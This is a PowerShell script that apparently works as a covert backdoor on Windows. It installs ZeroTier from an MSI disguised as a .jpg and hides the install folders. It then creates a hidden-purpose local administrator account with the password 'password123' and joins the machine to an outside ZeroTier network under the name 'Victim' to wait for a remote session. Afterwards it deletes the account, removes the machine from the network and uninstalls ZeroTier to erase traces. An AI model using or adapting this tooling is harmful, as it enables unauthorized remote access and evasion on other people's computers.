$NetworkID= 'Your ZeroTier network ID'
$token= 'Your ZeroTier api token'

function install-ZT ($path_to_installer){
    #Zt is masquerading as a .jpg. Rename it to .msi, install it and rename it back to jpg.
    $old_name= $path_to_installer
    $new_name= $path_to_installer-replace('.jpg','.msi')
    
    ren $old_name $new_name
    $CLI = 'C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat'
    cmd /c msiexec /i $new_name /qn /norestart 'ZTHEADLESS=Yes'

    #Hide the zt directories
    attrib +H "C:\Program Files (x86)\ZeroTier"
    attrib +H "C:\ProgramData\ZeroTier"

    ren $new_name $old_name    
}

function Create-User{
    New-LocalUser -Name "Service_account" -Password (ConvertTo-SecureString "password123" -AsPlainText -Force)
    Add-LocalGroupMember -Member Service_account -Group Administrators
}

function delete-user{
    Remove-LocalGroupMember -Member Service_account -Group administrators
    Remove-LocalUser -name Service_account
}

function Join-ZtNetwork($NetworkID,$token){
    $CLI = 'C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat'
    # Get Node ID
    $NodeID = (cmd /c $CLI info).split(' ')[2]   

    $headers = @{
        "Authorization" = "token $token"
    }

    $body = @{
        name = "Victim"
        description = ''
        config = @{ authorized = $True }
    } | ConvertTo-Json
    
    $url = "https://api.zerotier.com/api/v1/network/$NetworkID/member/$NodeID"
    
    $response= Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "application/json"
    $id= $($response.id).split('-')[1]
    
    #Quick disocnnect/reconnect to grab an IP
    $(cmd /c $CLI leave $NetworkID)
    sleep 1
    $(cmd /c $CLI join $NetworkID)

    return $id
}
###########################################################

function WaitFor-Session($NetworkID, $seconds){
    $CLI = 'C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat'
    #Wait for an interactive session. If no session after 30 seconds leave the network and uninstall ZT
    Remove-Variable -name session -ErrorAction SilentlyContinue
    $x= 0
    while (!$session -and $x -le $seconds){    
        $x
        $session= Get-NetTCPConnection | where {$_.LocalAddress -like "172.24.*"} | where {$_.state -eq "Established"}
        sleep 1
        $x++
    }

    if (!$session){
        $(cmd /c $CLI leave $NetworkID)
    }
    
    if ($session){
        while ($true){
            #monitor for disconnect string in the file. If found; leave the network
            if ($(get-content C:\Windows\Temp\abc.txt -ErrorAction SilentlyContinue) -eq "disconnect"){
                sleep 5
                $(cmd /c $CLI leave $NetworkID)
                del C:\Windows\Temp\abc.txt -ErrorAction SilentlyContinue
                break
            }
        }
    }
}

function DeleteSelfFrom-MemberList($token, $NetworkID, $id){
    $headers = @{
        "Authorization" = "token $token"
    }
        
    #Delete yourself from member list
    $url = "https://my.zerotier.com/api/network/$networkId/member/$Id"
    # Send the DELETE request
    $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Delete
}

function Uninstall-ZeroTier{
    $Paths = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    $ZeroTierOne = Get-ChildItem -Path $Paths | Get-ItemProperty | Where-Object { $_.DisplayName -like 'ZeroTier One' } | Select-Object
    $VirtualNetworkPort = Get-ChildItem -Path $Paths | Get-ItemProperty | Where-Object { $_.DisplayName -like 'ZeroTier One Virtual Network Port' } | Select-Object
    
    if ($ZeroTierOne) {
        Write-Output 'Uninstalling ZeroTier One...'
        foreach ($Ver in $ZeroTierOne) {
            $Uninst = $Ver.UninstallString
            cmd /c $Uninst /qn
        }
    }
    del C:\ProgramData\ZeroTier -force -Recurse -ErrorAction SilentlyContinue
}

####################

$path_to_MSI= "C:\users\user1\Desktop\ZeroTier_BD\totally_a_picture.jpg"

install-ZT $path_to_MSI                              #Installs ZT msi file is masquerading as a .jpg
Create-User                                          #Create a local user and add them to the administrator group
$id= $(Join-ZtNetwork $NetworkID $token)[-1]         #Join the ZeroTier Network
WaitFor-Session $NetworkID 20 | Out-Null             #If theres no session after 20 Seconds or if the word 'disconnect' is found in C:\windows\temp\abc.txt  kill the connection
DeleteSelfFrom-MemberList $token $NetworkID $id      #Completely remove the computer from the ZeroTier Network
delete-user                                          #Delete the local user we created 
Uninstall-ZeroTier                                   #Uninstall ZeroTier. The .jpg file that is really the .msi still remains on the box
